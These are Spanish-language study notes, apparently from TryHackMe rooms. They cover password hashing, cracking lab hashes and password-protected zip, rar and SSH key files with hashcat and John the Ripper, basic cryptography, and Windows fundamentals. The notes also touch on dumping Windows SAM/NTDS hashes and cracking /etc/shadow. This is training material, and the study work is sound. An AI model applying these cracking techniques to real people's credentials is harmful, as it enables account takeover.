Los hash son herramientas muy empleadas en el campo de la ciberseguridad que se emplean a modo de identificadores unívocos de entidades informáticas como por ejemplo contraseñas o software a nivel de producción.

Importante a su vez es el concepto de *hash collision*, que se produce cuando dos inputs diferentes pasan por la misma función de hash y generan el mismo output. MD5 y SHA1 han sido atacados y se han vuelto técnicamente inseguros debido a colisiones de hash de ingeniería.

<br />

**Utilidades del Hashing**

Como ya hemos comentado, el hashing se utiliza fundamentalmente para dos propósitos fundamentalmente. Verificar la integridad de los datos y verificar contraseñas.

La mayoría de las aplicaciones web necesitan verificar la contraseña de un usuario en algún momento. Almacenar estas contraseñas en texto sin formato sería malo. Probablemente haya visto noticias sobre empresas a las que se les filtró su base de datos. Conociendo a algunas personas, usan la misma contraseña para todo, incluso para sus operaciones bancarias, por lo que filtrarlas sería realmente muy malo.

Bastantes violaciones de datos han filtrado contraseñas de texto sin formato. Probablemente esté familiarizado con "rockyou.txt" en Kali como una lista de palabras de contraseña. Esto vino de una empresa que hizo widgets para MySpace. Almacenaron sus contraseñas en texto sin formato y la empresa tuvo una brecha. El archivo txt contiene más de 14 millones de contraseñas (aunque es poco probable que algunas hayan sido contraseñas de usuario. Ordene por longitud si quiere ver a qué me refiero).

Adobe tuvo una violación de datos notable que fue ligeramente diferente. Las contraseñas estaban cifradas, en lugar de hasheadas y el cifrado que se utilizó no era seguro. Esto significaba que el texto sin formato podía recuperarse con relativa rapidez. Si desea leer más sobre esta brecha, esta publicación de Sophos es excelente:  [https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic -torpeza/](https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/)

Linkedin también tuvo una violación de datos. Linkedin usó SHA1 para la verificación de contraseñas, que es bastante rápido de calcular usando GPU. 

No puede cifrar las contraseñas, ya que la clave debe almacenarse en algún lugar. Si alguien obtiene la clave, simplemente puede descifrar las contraseñas.

Aquí es donde entra en juego el hashing. ¿Qué sucede si, en lugar de almacenar la contraseña, solo almacena el hash de la contraseña? Esto significa que nunca tendrá que almacenar la contraseña del usuario, y si su base de datos se filtró, un atacante tendría que descifrar cada contraseña para averiguar cuál era. Eso suena bastante útil.

Solo hay un problema con esto. ¿Qué pasa si dos usuarios tienen la misma contraseña? Como una función hash siempre convertirá la misma entrada en la misma salida, almacenará el mismo hash de contraseña para cada usuario. Eso significa que si alguien descifra ese hash, ingresa a más de una cuenta. También significa que alguien puede crear una "tabla de arco iris" para romper los hashes.

Una tabla arcoíris es una tabla de búsqueda de hashes a textos sin formato, por lo que puede averiguar rápidamente qué contraseña tenía un usuario a partir del hash. Una tabla de arcoíris intercambia el tiempo necesario para descifrar un hash por espacio en el disco duro, pero se necesita tiempo para crear.

Aquí hay un ejemplo rápido para que pueda tratar de entender cómo son.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220718190402.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Password Cracking**

Existen diversas herramientas para llevar a cabo un crakeo del hash de una contraseña. Usualmente, estas herramientas funcionan cogiendo un input, construyendo un hash y comparándolo con un valor dado, si el resultado coincide, entonces es un posible candidato a contraseña. Algunas herramientas *Hashcat* and *JohnTheRipper* emplean este método.

Una gran ayuda para crakear las contraseñas es ser específico con el formato del hash, [aquí]https://hashcat.net/wiki/doku.php?id=example_hashes hay una lista de tipos de hashses de contraseñas en función del formato

Veamos algunos ejemplos, los siguientes hashes son introducidos en el :

- *Hash*: $2a$06$7yoU3Ng8dHTXphAg913cyO6Bjs3K5lBnwq5FJyA6d01pMSrddr1ZG

Podemos automáticamente emplear JohnTheRipper junto con el fichero rockyou.txt:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220718201931.png' | relative_url }}" text-align="center"/>
</div>

En primer lugar, queremos saber a qué formato se corresponde ya que hashcat actúa de forma más específica, para ello acudimos a la lista anterior y buscamos paralelismos entre términos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220718195039.png' | relative_url }}" text-align="center"/>
</div>

Finalmente, encontramos que se trata de *bcrypt*, así acudimos a hashcat y acudimos a la sección de ayuda con el modificador '--help':

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220718202330.png' | relative_url }}" text-align="center"/>
</div>

Entre otras cosas, observamos que tienen un listado de formatos de hash:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220718202536.png' | relative_url }}" text-align="center"/>
</div>

Así, buscamos el término bcrypt:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220718202615.png' | relative_url }}" text-align="center"/>
</div>

Y en consecuencia empleamos el siguiente comando:

```bash
hashcat -m 3200 file.txt /usr/share/wordlists/rockyou.txt
```

Obteniendo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220718202959.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Hash*: 9eb7ee7f551d2f0ac684981bd1f1e2fa4a37590199636753efe614d4db30e8e1

De nuevo, buscamos en la lista términos concretos para comprobar si existe algún tipo de paralelismo el paralelismo más coherente sería sha256(utf16le($pass)), sin embargo esto no nos da ningún resultado.

Así pues, introducimos nuestro hash en la herramienta Decodify que encuentra que se trata de SHA2:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220718234307.png' | relative_url }}" text-align="center"/>
</div>

Buscamos SHA2 en Hashcat y encontramos cuatro formatos disponibles:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220718234921.png' | relative_url }}" text-align="center"/>
</div>

Y al probar con SHA2-256 obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719000933.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *hash*: \$6\$GQXVvW4EuM$ehD6jWiMsfNorxy5SINsgdlxmAEl3.yif0/c3NqzGLa0P.S7KRDYjycw5bnYkF5ZtB8wQy8KnskuWQS3Yr1wQ0

De nuevo, empleando John no obetenemos nada y nos disponemos a encontrar paralelismos entre el hash que tenemos y los ejemplos de hash de los distintos formatos que encontramos en la página: https://hashcat.net/wiki/doku.php?id=example_hashes de forma que obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719001551.png' | relative_url }}" text-align="center"/>
</div>

Así, empleamos hashcat y:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719001623.png' | relative_url }}" text-align="center"/>
</div>

y con el mismo comando que hemos empleado en veces anteriores:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719001658.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *hash*: b6b0d451bbf6fed658659a9e7e5598fe

Intentamos emplear John pero no tenemos resultado, sin embargo, metemos el string en la herramienta [Decodify](https://github.com/s0md3v/Decodify) para intentar obtener el tipo de hash y obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719002235.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 4.2. JohnTheRipper.

**Introducción a JohnTheRipper**

*JohnTheRipper* es una de las herramientas de crackeo de hashing más conocidas y utilizadas. Recordamos que el *hash* es el producto que se obtiene de pasar un dato a través de una *función de hash* la cual lleva construye el mismo a través de realizar una transformación sobre ciertas partes de los datos y juntarlos obteniendo un constructo único para cada input. Es importante darse cuenta de que el hash no es un cifrado pues la totalidad de la información no se mantiene.

Sin embargo, esto no significa que obtener el input de salida sea totalmente imposible. Si se tiene un hash y el algoritmo de hash correspondiente, se puede probar a hashear un conjunto de datos para comprobar si alguno coincide, si de hecho coincide será un posible candidato a ser el input inicial.

A esto se le conoce como *ataque de diccionario* y es precisamente la metodología en la que se basa JohnTheRipper.

<br />

**Configurando JohnTheRipper**

JohnTheRipper está soportado por muchos OS. Para los que nos intersa que será kali o parrot: sudo apt install john y el comando es john o /usr/sbin/john.

También se puede obtener como un script desde github.

```bash
git clone https://github.com/openwall/john -b bleeding-jumbo john
```

<br />

**Wordlists**

Ya hemos comentado que el método de actuación de JohnTheRipper consiste llevar a cabo un proceso de comparación con una lista de valores que se hashean mediante un algoritmo de hash con el valor de hash a crackear.

Para ello por tanto necesitamos una lista de términos, estos en kali o parrot se encuentran dentro del directorio: /usr/share/wordlists. Dentro de este directorio está una famosa lista obtenida de una brecha de información llamada Rockyou.txt.

<br />

**Cracking Basic Hashes**

Hay múltiples formas de utililzar *JohnTheRipper* para crackear hashes simples.

- *John Basic Syntax*:

```bash
john <options> <path/to/file>
```

<br />

- *Automatic Craking*: John tiene funciones integradas para detectar con qué tipo de hash está tratando y para seleccionar las reglas y los formatos apropiados para descifrarlo.

```bash
john --wordlist=<path/to/wordlist> <path/to/file>
```

Por ejemplo: john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt

<br />

- *Identifying Hashes*: A veces, John no reconocerá correctamente automático y la carga de hashes, ¡está bien! Podemos usar otras herramientas para identificar el hash y luego configurar a John para que use un formato específico. Hay varias formas de hacer esto, como usar un identificador hash en línea como [este](https://hashes.com/en/tools/hash_identifier) o unaherramienta llamada [hash-identifier](https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master) , una herramienta de Python que proporciona una serie de candidatos para el tipo de hash que puede ser el input proporcionado, por ejemplo, sabemos que el siguiente hash es SHA2-512 según el ejercicio anterior. Empleando hash-identifier:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719170731.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Format-Specific Craking*:

```bash
john --format=<format> --wordlist=<path to wordlist> <path to file>
```

Los flags que se emplean son evidentes, un ejemplo de uso es:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
```

Cuando le dice a John que use formatos, si está tratando con un tipo de hash estándar, por ejemplo, md5 como en el ejemplo anterior, debe anteponerlo "raw-" para decirle a John que solo está tratando con un tipo de hash estándar, aunque esto no siempre se aplica. Para verificar si necesita agregar el prefijo o no, puede enumerar todos los formatos de John usando john --list=formats y verificar manualmente, o grep para su tipo de hash usando algo como john --list=formats | grep -iF "md5"

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719172653.png' | relative_url }}" text-align="center"/>
</div>

<br />

Veamos ahora una serie de ejemplos prácticos:

- *Hash1.txt*: 2e728dd31fb5949bc39cac5a9f066498

En primer lugar lo introducimos en *hash-identifier* para identificar el tipo de hash que es

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719173056.png' | relative_url }}" text-align="center"/>
</div>

Así, sabemos que es MD5 estándard y buscamos el formato en la lista de john para saber cómo indicarlo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719173355.png' | relative_url }}" text-align="center"/>
</div>

Colocamos el formato y procedemos a ejecutar john sobre el fichero con el hash:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719173419.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Hash2.txt*: 1A732667F3917C0F4AA98BB13011B9090C6F8065

Repetimos la secuencia anterior, priemero buscamos el formato, luego buscamos si dicho formato está disponible a utilizar con john y ejecutamos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719173919.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719174001.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719174031.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Hash3.txt*: D7F4D3CCEE7ACD3DD7FAD3AC2BE2AAE9C44F4E9B7FB802D73136D4C53920140A

Repetimos el mismo proceso:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719174358.png' | relative_url }}" text-align="center"/>
</div>

- *Hash4.txt*: c5a60cc6bbba781c601c5402755ae1044bbf45b78d1183cbf2ca1c865b6c792cf3c6b87791344986c8a832a0f9ca8d0b4afd3d9421a149d57075e1b4e93f90bf

Repetimos el mismo proceso:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719174712.png' | relative_url }}" text-align="center"/>
</div>

Sin emabargo, esta vez con la primera opción que nos ofrece hash-identifier (SHA512) no obtenemos nada, así, pobramos con "Whirlpool":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719174805.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Cracking Windows Authentication Hashes**

 Los hashes de autenticación son las versiones hasheadas de las contraseñas que almacenan los sistemas operativos, a veces es posible descifrarlas usando los métodos de fuerza bruta que estamos usando. Para obtener estos hashes, a menudo ya debe ser administrador, por lo que explicaremos algunos de los hashes que planeamos descifrar a medida que los intentamos.

Concretamente, *NTHash* / *NTLM* es el formato de hash que los Windows OS modernos emplean para guardar contraseñas de usuarios y servicios. Estos pueden adquirirses volcando la base de datos SAM de una máquina windows empleando *Mimikatz* o la base de datos de Active Directory: NTDS.dit.

Veamos un ejemplo práctico:

- *ntlm.txt*: 5460C85BD858A11475115D2DD3A82333

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719183047.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Cracking /etc/shadow Hashes**

El archivo */etc/shadow* es el archivo en las máquinas Linux donde se almacenan los hash de las contraseñas. También almacena otra información, como la fecha del último cambio de contraseña y la información de vencimiento de la contraseña. Contiene una entrada por línea para cada usuario o cuenta de usuario del sistema. Por lo general, solo el usuario root puede acceder a este archivo, por lo que para obtener los hashes debe tener suficientes privilegios, pero si los tiene, existe la posibilidad de que pueda descifrar algunos de los hashes.

John es muy particular acerca de los formatos en los que necesita los datos para poder trabajar con ellos, por esta razón, para descifrar las contraseñas de /etc/shadow, debe combinarlo con el archivo /etc/passwd para que John comprender los datos que se le están dando. Para hacer esto, usamos una herramienta integrada en el conjunto de herramientas de John llamada *unshadow*. La sintaxis básica de unshadow es la siguiente:

```bash
unshadow <path to passwd> <path to shadow>
```

Entonces podemos dirigir la salida de unshadow, en nuestro caso de uso de ejemplo llamado "unshadowed.txt" directamente a John. No deberíamos necesitar especificar un modo aquí ya que hemos hecho la entrada específicamente para John, sin embargo, en algunos casos necesitará especificar el formato como lo hemos hecho anteriormente.

Veamos un caso práctico, tenemos un fichero con el contenido de los ficheros /etc/passwd y /etc/shadow, esto se puede saber a simple vista si se está famirializado con el tipo de contenido de cada fichero.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719190432.png' | relative_url }}" text-align="center"/>
</div>

Así, cogemos los contenidos y los introducimos en ficheros separados:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719190815.png' | relative_url }}" text-align="center"/>
</div>

Y llamamos al comando de john *unshadow* y pasamos su output a JohnTheRipper:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220719191308.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Single Crack Mode**

Hasta ahora hemos estado usando el modo de lista de palabras de John para lidiar con la fuerza bruta simple y no tan simple hash. Pero John también tiene otro modo, llamado *Single Crack*. En este modo, John usa solo la información provista en el nombre de usuario para tratar de encontrar posibles contraseñas de manera heurística, cambiando ligeramente las letras y los números contenidos en el nombre de usuario. Este proceso es conocido como *Word Mangling*

Por ejemplo, para el nombre: Markus, John daría por válidas algunas contraseñas para las siguientes:

- Markus1, Markus2, Markus3, etc.
- MArkus1, MARkus, MARKus, etc.
- Markus!, Markus$, Markus*, etc.

Para emplear el modo Single Crack empleamos la siguiente sintaxis:

```bash
john --single --format=<format> <path/to/file>
```

Veamos un caso práctico de uso:

- *hash7.txt*: 7bf6d9bb82bed1302f331fc6b816aada

En primer lugar, introducimos el hash en hash-identifier para averiguar el formato:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220720095033.png' | relative_url }}" text-align="center"/>
</div>

Como vemos, existen dos posibilidades, o bien es un NT de windows, o un MD5 a secas.

De esta forma, añadimos ahora el nombre del propietario del hash, Joker.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220720095129.png' | relative_url }}" text-align="center"/>
</div>

Y procedemos a ejecutar John con el modo Single Crack:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220720095313.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Custom Rules**

Las *Custom Rules* son reglas que pueden definirse en John para construir contraseñas de acuerdo a ciertos criterios. Esto es especialmente útil cuando se conoce la estructura de la contraseña que se desea atacar.

Por ejemplo algunas organizaciones emiten mensajes de cómo debe ser la contraseña por ejemplo; "su contraseña debe tener al menos una letra mayúscual, símbolo y un número". Además en muchos casos se puede predecir el lugar en el que los usuarios introducirán estas características: Polocontraseña1!

Las reglas se encuentran en el archivo "john.conf".

<br />

**Cracking Password Protected File**

Podemos emplear algunas partes separadas de la suite de JohnTheRipper para crackear contraseñas de archivos comprimidos zip, rar, e incluso ssh.

- Para los archivos *zip*, vamos a emplear *zip2john*, se trata de una herramienta que forma parte de la suite de JohnTheRipper similar a la herramienta *unshadow* utilizada anteriormente. Concretamente esta herramienta convierte el fichero zip en un tipo de formato hash que luego John puede descifrar. El uso básico es el siguiente:

```bash
zip2john <options> <zip file> > <output file>
```

Vamos a crakear una carpeta zip protegida con contraseña (secure.zip) empleando la lista rockyou.txt:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220720161226.png' | relative_url }}" text-align="center"/>
</div>

Como se puede ver, primero se emplea el *zip2john* y se crakea el resultado con *john* como si fuera un hash convencional. Así, seguidamente

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220720161932.png' | relative_url }}" text-align="center"/>
</div>

<br />

- Para los archivos *rar* tenemos una herramienta parecida llamada *rar2john* que actúa de forma similar. Supongámos que pretendemos crackear una archivo rar, secure.rar.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220720163150.png' | relative_url }}" text-align="center"/>
</div>

Y desempaquetamos obteniendo la flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220720163512.png' | relative_url }}" text-align="center"/>
</div>

- Para las claves ssh contenidos en archivos id_rsa o similar tenemos el comando *ssh2john* que actúa convirtiendo el contenido "id_rsa" en un formato hash para que john pueda crakearlo. Veamos un caso práctico, supongámos que queremos crackear el contenido de idrsa.id_rsa.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220720165126.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 4.3. Encryption-Crypto 101.

**Terminos clave**

Para aprender los contenidos que se enseñan a continuación es necesario tener claro los siguientes conceptos:

- *Ciphertext*: El resultado de cifrar un texto plano.
- *Cipher*: Un método de cifrado de los datos.
- *Plaintext*: Los datos que todavía no han sido cifrados.
- *Encryption*: La acción de transformar texto plano en texsto cifrado. El cifrado asimétrico emplea distintas llaves para cifrar y descifrar mientras que el cifrado simétrico emplea la misma clave para cifrar y descifrar.
- *Encoding*: Es un método de transformación de datos inmediatamente reversible. No se trata de un cifrado, la principal diferencia entre un cifrado y una codificación es que la última consiste en la alteración de la semantica del mensaje.
- *Key*: Un fragmento de información necesaria para correctamente descifrar datos.
- *passphrase*: Algo similar a una contraseña pero protege claves de cifrado.

<br />

**Por qué la criptografía es importante**

La criptografía tiene una gran importancia en ciberseguridad debido a que se utiliza para garantizar la confidencialidad de los datos y asegurar su integridad y autenticidad.

<br />

**Operación módulo (matemáticas)**

El *módulo* de un número sobre otro es el resto que queda al dividir el primero entre el segundo. Por ejemplo:

- 20 % 4 = 0. Ya que 20 entre 4 da 5 sin resto.
- 21 % 4 = 1. Ya que 21 entre 4 da 5 con resto 1.
- 24 % 4 = 0. Ya que 24 entre 4 es 6 sin resto.

<br />

**Tipos de cifrado**

El cifrado de datos en esencia consiste en la transformación de un conjunto de datos mediante la aplicación de un algoritmo o clave de cifrado. A este respecto, existen dos tipos de cifrados:

- *Cifrado Simétrico*: Emplea la misma clave (algoritmo) para cifrar y descifrar datos. Emplean claves más pequeñas y son más rápidos.
- *Cifrado Asimétrico*: Emplea una clave (*clave pública*) para cifrar y otra clave basada en el algoritmo inverso (*clave privada*) de la primera para descifrar. Observemos que al ser algoritmos inversos el uso que se da a cada clave es arbitrario ya que la clave pública descifra el contenido que cifra la clave privada y viceversa, la clave privada descifra el contenido cifrado por la clave pública.

<br />

**RSA - Rivest Shamir Adleman**

RSA es un criptosistema de clave pública que se usa ampliamente para la transmisión segura de datos. También es uno de los más antiguos. 

Tiene su origen en el cálculo de los factores de un número.

<br />

**Establecimiento de claves mediante criptografía asimétrica**

Un uso muy común del cifrado asimétrico es el *intercambio de claves para cifrado simétrico*.

Un buen ejemplo de esto es el cifrado de HTTPS, el cifrado asimétrico es muy lento y por ello se emplea el cifrado simétrico. El método es el siguiente:

- En primer lugar un cliente desea establecer una conexión HTTPS con un servidor. De forma que envía su llave pública al servidor.

- El servidor recibe la llave pública y construye una llave simétrica que es posteriomente cifrada con la llave pública y enviada al cliente.

- Una vez el cliente recibe la llave simétrica cifrada, la descifra con su llave privada y se abre un canal de comunicación seguro entre el cliente y el servidor mediante la clave simétrica.


<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220720233202.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Firmas digitales y Certificados**

Las *firmas digitales* son un método de probar la autenticidad de tus ficheros. Para ello, quien a creado o modificado las firma mediante criptografía asimétrica empleando una llave privada firma unos ficheros y dicha firma puede luego ser comprobada mediante la llave pública que tiene la persona que recibe dichos documentos.

Por otra parte los certificados son otro ejemplo de uso de las llaves públicas, estos mediante criptografía prueban que un sitio web es de hecho lo que dice que es.

<br />

**Cifrado y autenticación SSH**

Por defecto, la autenticación del servicio SSH se realiza mediante credenciales convencionales username:password. Sin embargo, esta configuración puede cambiarse para que la autenticación se produzca mediante claves asimétricas.

Por defecto, las claves SSH son RSA, puedes elegir qué algoritmo emplear. El comando para crear llaves SSH es *ssh-keygen*.

El comando para emplear un par de llaves en lugar de unas credencialiles para un determinado usuario en una máquina es:

```bash
ssh -i <keys> <user>@<host>
```

Las llaves de SSH (y cualquier otra llave de cifrado) cuenta con una barrera de protección: la *passphrase*, la cual se emplea para a su vez descifrar las claves.

<br />

### 5. Windows Explotation Basics.

#### 5.1. Fundamentos de Windows I.

**Introducción al Windows OS**

El sistema operativo Windows es actualmente el dominante tanto en redes corporativas como en redes domésticas. Por esta razón, Windows es uno de los sistemas más atacados.

<br />

**Escritorio de Windows**

El escritorio de Windows emplea el GUI (Graphical User Interface) para mostrar un escritorio interactivo y visual en la máquina.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709165538.png' | relative_url }}" text-align="center"/>
</div>

1. The Desktop
2. Start Menu
3. Search Box (Cortana)
4. Task View
5. Taskbar
6. Toolbars
7. Notification Area

<br />

- *Desktop*:

El escritorio es una sección en la que comúnmente encontramos accesos directos a otros artefactos informáticos. Así como carpetas, aplicaciones, etc.

La apariencia del escritorio puede ser modificada al gusto así como los iconos que muestran, está diseñado para ser cómodo, personalizado y ofrecer un acceso rápido a los aparatos con los que el usuario suele intarctuar más amenudo.

<br />

- *The Start Menu*:

El "start" menu es una parte de Windows que da acceso completo a cualquier otra parte del dispositivo

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709165539.png' | relative_url }}" text-align="center"/>
</div>

Se divide en la barra de búsqueda, las aplicaciones más recientemente añadidas y una sugerencia de Windows.

<br />

**The File System**

El sistema de ficheros empleado en las versiones más modernas es el *NTFS*, siglas que responden a *New Technology File System*.

Antes se encontraban FAT16/32 (File Alocation System) y el HPFS (High Performance File System).

NTFS se conoce como un "journaling file system" (sistema de ficheros basado en registro). Es decir, **en caso de fallo, el sistema de archivos puede reparar automáticamente las carpetas/archivos en el disco utilizando la información almacenada en un archivo de registro**. Esta función no es posible con sistemas anteriores.

Entre algunas de las características más importantes están:

- Soporta ficheros que pesan más de 4GB
- Puede configurar permisos específicos sobre carpetas y ficheros. Estos son permisos son:
- Full control.
- Modify.
- Read & Execute.
- List folder contents.
- Read.
- Write.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709165540.png' | relative_url }}" text-align="center"/>
</div>

Los permisos pueden verse mediante los siguientes pasos: Click-derecho sobre carpeta > Propiedades > Seguridad > Usuario o grupo cuyos permisos se desean ver.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709165541.png' | relative_url }}" text-align="center"/>
</div>

- Admite archivos comprimidos (ya sean carpetas o ficheros).
- El sistema de archivos puede cifrarse.
- Alternate Data Streams (ADS), permite archivas metadatos de un fichero sin necesidad de crear otro fichero para almcenar estos metadatos creando más de un flujo de datos para un solo fichero. Desde la perspectiva de la ciberseguridad esto es importante debido a que se podría ocultar datos en un segundo streams de datos.

<br />

**The Windows\\System32 Folders**

La carpeta "C:\\Windows" se conoce tradicionalmente como la carpeta que contiene el sistema operativo de windows, aunque técnicamente y variando convenientemente las "variables de entorno" no tiene por qué encontrarse en esa localización tan concreta.

Dentro de esta carpeta encontramos un montón de archivos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709165542.png' | relative_url }}" text-align="center"/>
</div>

Y entre todas esas carpetas encontramos específicamente la carpeta System 32:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709165543.png' | relative_url }}" text-align="center"/>
</div>

Esta carpeta contiene archivos que pueden ser críticos para el sistema operativo, borrarlos podría resultar en una falta de funcionalidad por parte del sistema.

<br />

**User Accounts Profiles and Permissons**

En Windows hay dos tipos de usuarios: Administrator o Standard User.

El tipo de cuenta de usuario determina las acciones que el mismo puede hacer:

- Administartor: puede llevar a cabo cambios: añadir usuarios, borrar usuarios, modificar configuraciones, etc.

- Standard User: Sólo puede hacer modificaciones sobre archivos sobre los que tiene propiedad.

Para ver qué otros usuarios hay en la máquina podemos buscar en "Start Menu", Other User y acudir a System Settings > Other users.

Todos los usuarios tienen asociados una serie de "carpetas personales" (Desktop, Documents, Downloads, ...) estos documentos son accesibles desde el Local User and Group Management: Win+R > lusrmgr.msc

<br />

**User Account Control**

UAC son siglas que responde a User Account Control y se trata de una herramienta de protección y acompasamiento entre un usuario con capacidades de adminstrador y el sistema.

Concretamente, sirve para que cada vez que el usuario lleva a cabo una acción (él o una aplicación que él ejecuta) no tenga que elevarse a administrador sino sencillamente conceder permisos. Cada vez que se requiere salta una ventana que pide al usuario una concesión de permisos. Cada vez que esto pueda ser necesario para una aplicación aparecera un escudo junto al logotipo indicando que la UAC elevara privilegios al ejecutar el programa:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709165544.png' | relative_url }}" text-align="center"/>
</div>

Una vez intentemos ejecutar el programa no saltara una ventanita como la siguiente:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183746.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Settings and The Control Panel**

*Settings* y *Control Panel* son dos conjuntos de opciones donde podemos modificar preferencias a nuestro gusto Windows 10:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183747.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183748.png' | relative_url }}" text-align="center"/>
</div>

Desde opciones de configuración de cuentas, red, a apariencia del escritorio, etc.

<br />

**Task Manager**

El *Task Manager* (Administrador de tareas) proporciona información sobre las aplicaciones y los procesos que se ejecutan actualmente en el sistema. También hay disponible otra información, como la cantidad de CPU y RAM que se utilizan, que se incluye en Rendimiento.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183749.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 5.2. Fundamentos de Windows II.

**System Configuration**

El *System Configuration* (msconfig) es una utilidad la resolución avanzada de problemas. Su propósito principal es el de ayudar a diagnosticar problemas del inicio del equipo.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183750.png' | relative_url }}" text-align="center"/>
</div>

Es probable que se necesiten permisos de administrador para utilizar esta herramienta.

Una vez hemos abierto esta herramienta encontramos cinco pestañas: General, Boot, Services, Startup, Tools.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183751.png' | relative_url }}" text-align="center"/>
</div>

- *General*: Desde esta pestaña podemos elegir qué dispositivos o servicios se inician desde el inicio del sistema.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183752.png' | relative_url }}" text-align="center"/>
</div>

- *Boot*: Definimos opciones de arranque del sistema.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183753.png' | relative_url }}" text-align="center"/>
</div>

- *Service*: Muestra una lista de todos los servicios (procesos en segundo plano) que corren en el sistema:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183754.png' | relative_url }}" text-align="center"/>
</div>

- *Tools*: Presenta una lista de herramientas que pueden configurarse y que esta instaladas.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183755.png' | relative_url }}" text-align="center"/>
</div>

Notemos el recuadro "Selected Command"

<br />

**Change UAC Settings**

Se pueden cambiar los controles de la UAC para que sea menos restrictiva. Existen diversos niveles:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183756.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Computer Management**

Dentro del panel del *System Configuration* encontramos el *Computer Management* (compmgmt) la cual tiene tres secciones: *System Tools*, *Storage*, *Services & Applications*.

- *System Tools*: Dentro de esta sección tenemos una serie de herramientas:

